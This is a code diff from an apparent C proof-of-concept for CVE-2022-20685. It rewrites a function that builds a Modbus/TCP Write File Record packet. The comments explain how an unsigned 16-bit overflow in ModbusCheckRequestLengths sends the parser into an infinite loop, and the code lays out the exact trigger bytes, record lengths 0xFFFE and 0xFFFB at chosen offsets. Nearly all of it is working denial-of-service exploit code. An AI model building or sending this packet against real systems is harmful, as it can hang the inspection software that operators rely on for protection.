@@ -105,42 +105,64 @@ static int tcp_connect(const char *ip, int port) {
 
 static void build_cve_20685_packet(uint8_t *packet, size_t *len) {
     /*
-     * MBAP Header (7 bytes) + Write File Record PDU
+     * CVE-2022-20685 Exploit Packet
+     *
+     * The vulnerability is in ModbusCheckRequestLengths() at modbus_decode.c:187-228.
+     * After reading record_length, the code calculates:
+     *     bytes_processed += 7 + (2 * record_length);
+     *
+     * This can overflow uint16_t. The next read uses bytes_processed as offset:
+     *     record_length = *(payload + bytes_processed + 5);
+     *
+     * CRITICAL INSIGHT: After overflow, we read from a DIFFERENT offset!
+     *
+     * Attack sequence:
+     * 1. bytes_processed = 0, read from offset 5 → record_length = 0xFFFE
+     *    bytes_processed = 0 + 7 + 2*0xFFFE = 0x20003 → overflows to 3
+     *
+     * 2. bytes_processed = 3, read from offset 8 → record_length = 0xFFFB
+     *    bytes_processed = 3 + 7 + 2*0xFFFB = 0x20000 → overflows to 0
+     *
+     * 3. bytes_processed = 0 again → INFINITE LOOP (oscillates 0 → 3 → 0 → ...)
+     *
+     * Packet structure (sub-request data, 14 bytes):
+     *   Offset 0:   0x06 (ref_type - required for validation)
+     *   Offset 1-4: padding
+     *   Offset 5-6: 0xFFFE (record_length for first read)
+     *   Offset 7:   padding
+     *   Offset 8-9: 0xFFFB (record_length for second read after overflow)
+     *   Offset 10-13: padding
      */
     size_t idx = 0;
 
-    /* MBAP Header */
+    /* MBAP Header (7 bytes) */
     packet[idx++] = 0x00;  /* Transaction ID high */
     packet[idx++] = 0x01;  /* Transaction ID low */
     packet[idx++] = 0x00;  /* Protocol ID high (Modbus) */
     packet[idx++] = 0x00;  /* Protocol ID low */
-
-    /* Length field: Unit ID (1) + PDU length */
-    /* PDU = 1 (func) + 1 (data len) + 1 (ref type) + 2 (file#) + 2 (rec#) + 2 (rec len) = 9 */
-    uint16_t mbap_length = 1 + 9;
-    packet[idx++] = (mbap_length >> 8) & 0xFF;  /* Length high */
-    packet[idx++] = mbap_length & 0xFF;         /* Length low */
-
+    packet[idx++] = 0x00;  /* Length high */
+    packet[idx++] = 0x11;  /* Length low = 17 (Unit ID + PDU) */
     packet[idx++] = 0x01;  /* Unit ID */
 
     /* PDU: Write File Record (Function 0x15) */
-    packet[idx++] = 0x15;  /* Function code: Write File Record */
+    packet[idx++] = 0x15;  /* Function code */
+    packet[idx++] = 0x0E;  /* Request data length = 14 bytes */
 
-    /* Request data length (remaining bytes in sub-request) */
-    packet[idx++] = 0x07;  /* 7 bytes: ref_type(1) + file#(2) + rec#(2) + rec_len(2) */
-
-    /* Sub-request */
-    packet[idx++] = 0x06;  /* Reference type (always 0x06 for file records) */
-
-    packet[idx++] = 0x00;  /* File number high */
-    packet[idx++] = 0x01;  /* File number low */
-
-    packet[idx++] = 0x00;  /* Record number high */
-    packet[idx++] = 0x00;  /* Record number low */
-
-    /* TRIGGER: Record length = 0xFFFE causes integer overflow! */
-    packet[idx++] = (TRIGGER_RECORD_LENGTH >> 8) & 0xFF;  /* 0xFF */
-    packet[idx++] = TRIGGER_RECORD_LENGTH & 0xFF;         /* 0xFE */
+    /* Sub-request data (14 bytes) - crafted for offset exploitation */
+    packet[idx++] = 0x06;  /* Offset 0: Reference type (required) */
+    packet[idx++] = 0x00;  /* Offset 1: padding */
+    packet[idx++] = 0x00;  /* Offset 2: padding */
+    packet[idx++] = 0x00;  /* Offset 3: padding */
+    packet[idx++] = 0x00;  /* Offset 4: padding */
+    packet[idx++] = 0xFF;  /* Offset 5: record_length HIGH (0xFFFE) - first read */
+    packet[idx++] = 0xFE;  /* Offset 6: record_length LOW */
+    packet[idx++] = 0x00;  /* Offset 7: padding */
+    packet[idx++] = 0xFF;  /* Offset 8: record_length HIGH (0xFFFB) - second read */
+    packet[idx++] = 0xFB;  /* Offset 9: record_length LOW */
+    packet[idx++] = 0x00;  /* Offset 10: padding */
+    packet[idx++] = 0x00;  /* Offset 11: padding */
+    packet[idx++] = 0x00;  /* Offset 12: padding */
+    packet[idx++] = 0x00;  /* Offset 13: padding */
 
     *len = idx;
 }
